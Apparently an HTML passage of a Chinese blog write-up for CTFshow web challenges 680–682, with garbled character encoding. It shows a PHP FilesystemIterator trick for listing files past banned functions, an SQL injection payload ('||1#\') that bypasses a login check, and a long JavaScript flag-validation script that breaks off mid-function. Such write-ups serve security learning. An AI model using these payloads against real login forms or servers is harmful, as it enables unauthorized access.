class="post-meta-item__value">2022-06-12</span></span><span class="post-meta-item post-meta-item--visitors leancloud_visitors" id="/posts/76fe6b8e.html" data-flag-title="CTFshowå¤§èµ›åŸé¢˜"><span class="post-meta-item__icon"><i class="fas fa-eye"></i></span><span class="post-meta-item__info">é˜…è¯»æ¬¡æ•°</span><span class="post-meta-item__value leancloud-visitors-count"></span></span></div></header><div class="post-body"><div class="post-excerpt"><p><strong>680</strong></p>
<p>postä¼ å…¥<code>code=phpinfo();</code>æ‰§è¡ŒæˆåŠŸï¼ŒæŸ¥çœ‹è¢«banå‡½æ•°ï¼Œæ— æ³•æ‰§è¡Œå‘½ä»¤ï¼Œä½¿ç”¨åŸç”Ÿç±»æŸ¥çœ‹æ–‡ä»¶</p>
<pre class="line-numbers language-none"><code class="language-none">code&#x3D;$a&#x3D;new FilesystemIterator(&quot;.&quot;);var_dump ($a);<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090028188.png"></p>
<p>ä¸‹è½½æ–‡ä»¶å³å¯</p>
<p><strong>681</strong></p>
<p>æŠ“åŒ…å‘ç°è¿”å›å†…å®¹ä¸ºsqlè¯­å¥</p>
<p><img src="https://jlan-blog.oss-cn-beijing.aliyuncs.com/202206090039242.png"></p>
<p>è¿‡æ»¤äº†ç©ºæ ¼å’Œå¼•å·ï¼Œä¼šè¢«åï¼Œå°è¯•æ„é€ payloadï¼Œå‘ç°#å¯ç”¨ï¼Œ\å¯ç”¨ï¼Œæ„é€ è¯­å¥<code>||1#\</code>æ­¤æ—¶æ‰§è¡Œè¯­å¥ä¸º</p>
<pre class="line-numbers language-sql" data-language="sql"><code class="language-sql"><span class="token keyword">select</span> <span class="token function">count</span><span class="token punctuation">(</span><span class="token operator">*</span><span class="token punctuation">)</span> <span class="token keyword">from</span> ctfshow_users <span class="token keyword">where</span> username <span class="token operator">=</span> <span class="token string">'||1#\' or nickname = '</span><span class="token operator">||</span><span class="token number">1</span><span class="token comment">#\'</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>ç›¸å½“äºåˆ¤æ–­usernameæ˜¯å¦ç­‰äº<code>||1&#39; or nickname = </code>è¿™ä¸€å­—ç¬¦ä¸²æˆ–ä¸€ï¼Œç»“æœæ°¸çœŸï¼Œç™»å½•å³å¯æ‹¿åˆ°flag</p>
<p><strong>682</strong></p>
<p>è¿™è¾ˆå­ç¬¬ä¸€æ¬¡ç¢°åˆ°jsä»£ç å®¡è®¡ï¼Œçœ‹å‘—</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">var</span> <span class="token function-variable function">c2n</span>  <span class="token operator">=</span> <span class="token parameter">c</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span>length<span class="token operator">></span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token number">0</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0x60</span> <span class="token operator">&amp;&amp;</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0x67</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> c<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x57</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span><span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">parseInt</span><span class="token punctuation">(</span>c<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">return</span> <span class="token number">0</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">var</span> <span class="token function-variable function">s2n2su</span> <span class="token operator">=</span> <span class="token parameter">s</span> <span class="token operator">=></span><span class="token punctuation">&#123;</span>
    r<span class="token operator">=</span><span class="token number">0</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> i <span class="token operator">=</span> s<span class="token punctuation">.</span>length <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">>=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        r<span class="token operator">+=</span><span class="token function">c2n</span><span class="token punctuation">(</span>s<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">return</span> r
<span class="token punctuation">&#125;</span>

<span class="token keyword">function</span> <span class="token function">test</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">var</span> m<span class="token operator">=</span>document<span class="token punctuation">.</span><span class="token function">getElementById</span><span class="token punctuation">(</span><span class="token string">"message"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>value<span class="token punctuation">;</span>
    <span class="token keyword">var</span> e <span class="token operator">=</span> <span class="token string">'error'</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>m<span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"e3a331710b01ff3b3e34d5f61c2c9e1393ccba3e31f814e7debd537c97ed7d3d"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">var</span> start <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>start<span class="token operator">!==</span><span class="token string">'ctfshow&#123;'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span>m<span class="token punctuation">.</span>length<span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"&#125;"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">var</span> s <span class="token operator">=</span> m<span class="token punctuation">.</span><span class="token function">substring</span><span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span>m<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>s<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">36</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">var</span> k <span class="token operator">=</span> s<span class="token punctuation">.</span><span class="token function">split</span><span class="token punctuation">(</span><span class="token string">"-"</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">.</span>length<span class="token operator">!==</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">s2n2su</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">63</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"c578feba1c2e657dba129b4012ccf6a96f8e5f684e2ca358c36df13765da8400"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha256</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">.</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token number">4</span><span class="token punctuation">,</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">"f9c1c9536cc1f2524bc3eadc85b2bec7ff620bf0f227b73bcb96c1f278ba90dc"</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>



    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'dda'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">!==</span><span class="token string">'e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">+</span>k<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token operator">!=</span><span class="token number">0x1ae</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>


    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token punctuation">(</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">parseInt</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">2</span><span class="token operator">+</span><span class="token function">c2n</span><span class="token punctuation">(</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token number">0x12</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">sha224</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'abd37534c7d9a2efb9465de931cd7055ffdb8879563ae98078d6d6d5'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">st3</span><span class="token punctuation">(</span>k<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token operator">!==</span><span class="token string">'GVSTMNDGGQ2DSOLBGUZA===='</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
        <span class="token keyword">return</span> <span class="token function">alert</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>

    <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">'you are right'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>




<span class="token keyword">const</span> Base64 <span class="token operator">=</span> <span class="token punctuation">&#123;</span>
    <span class="token literal-property property">_keyStr</span><span class="token operator">:</span> <span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/="</span><span class="token punctuation">,</span>
    <span class="token function-variable function">encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">,</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>
        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        e <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_encode</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            n <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            i <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s <span class="token operator">=</span> n <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>
            o <span class="token operator">=</span> <span class="token punctuation">(</span>n <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> r <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>
            u <span class="token operator">=</span> <span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> i <span class="token operator">>></span> <span class="token number">6</span><span class="token punctuation">;</span>
            a <span class="token operator">=</span> i <span class="token operator">&amp;</span> <span class="token number">63</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                u <span class="token operator">=</span> a <span class="token operator">=</span> <span class="token number">64</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token function">isNaN</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                a <span class="token operator">=</span> <span class="token number">64</span>
            <span class="token punctuation">&#125;</span>
            t <span class="token operator">=</span> t <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>o<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>u<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>a<span class="token punctuation">)</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> t
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token function-variable function">decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> n<span class="token punctuation">,</span> r<span class="token punctuation">,</span> i<span class="token punctuation">;</span>
        <span class="token keyword">var</span> s<span class="token punctuation">,</span> o<span class="token punctuation">,</span> u<span class="token punctuation">,</span> a<span class="token punctuation">;</span>
        <span class="token keyword">var</span> f <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">[^A-Za-z0-9+/=]</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            s <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            o <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            u <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            a <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>_keyStr<span class="token punctuation">.</span><span class="token function">indexOf</span><span class="token punctuation">(</span>e<span class="token punctuation">.</span><span class="token function">charAt</span><span class="token punctuation">(</span>f<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            n <span class="token operator">=</span> s <span class="token operator">&lt;&lt;</span> <span class="token number">2</span> <span class="token operator">|</span> o <span class="token operator">>></span> <span class="token number">4</span><span class="token punctuation">;</span>
            r <span class="token operator">=</span> <span class="token punctuation">(</span>o <span class="token operator">&amp;</span> <span class="token number">15</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">4</span> <span class="token operator">|</span> u <span class="token operator">>></span> <span class="token number">2</span><span class="token punctuation">;</span>
            i <span class="token operator">=</span> <span class="token punctuation">(</span>u <span class="token operator">&amp;</span> <span class="token number">3</span><span class="token punctuation">)</span> <span class="token operator">&lt;&lt;</span> <span class="token number">6</span> <span class="token operator">|</span> a<span class="token punctuation">;</span>
            t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>u <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>a <span class="token operator">!=</span> <span class="token number">64</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">=</span> t <span class="token operator">+</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        t <span class="token operator">=</span> Base64<span class="token punctuation">.</span><span class="token function">_utf8_decode</span><span class="token punctuation">(</span>t<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> t
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token function-variable function">_utf8_encode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        e <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">replace</span><span class="token punctuation">(</span><span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">rn</span><span class="token regex-delimiter">/</span><span class="token regex-flags">g</span></span><span class="token punctuation">,</span> <span class="token string">"n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">;</span> n<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            <span class="token keyword">var</span> r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">&lt;</span> <span class="token number">128</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r<span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token keyword">if</span> <span class="token punctuation">(</span>r <span class="token operator">></span> <span class="token number">127</span> <span class="token operator">&amp;&amp;</span> r <span class="token operator">&lt;</span> <span class="token number">2048</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">|</span> <span class="token number">192</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">12</span> <span class="token operator">|</span> <span class="token number">224</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">>></span> <span class="token number">6</span> <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                t <span class="token operator">+=</span> String<span class="token punctuation">.</span><span class="token function">fromCharCode</span><span class="token punctuation">(</span>r <span class="token operator">&amp;</span> <span class="token number">63</span> <span class="token operator">|</span> <span class="token number">128</span><span class="token punctuation">)</span>
            <span class="token punctuation">&#125;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> t
    <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>
    <span class="token function-variable function">_utf8_decode</span><span class="token operator">:</span> <span class="token keyword">function</span> <span class="token punctuation">(</span><span class="token parameter">e</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">var</span> t <span class="token operator">=</span> <span class="token string">""</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> n <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> r <span class="token operator">=</span> c1 <span class="token operator">=</span> c2 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">while</span> <span class="token punctuation">(</span>n <span class="token operator">&lt;</span> e<span class="token punctuation">.</span>length<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
            r <span class="token operator">=</span> e<span class="token punctuation">.</span><span class="token function">charCodeAt</span><span class="token punctuation">(</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>
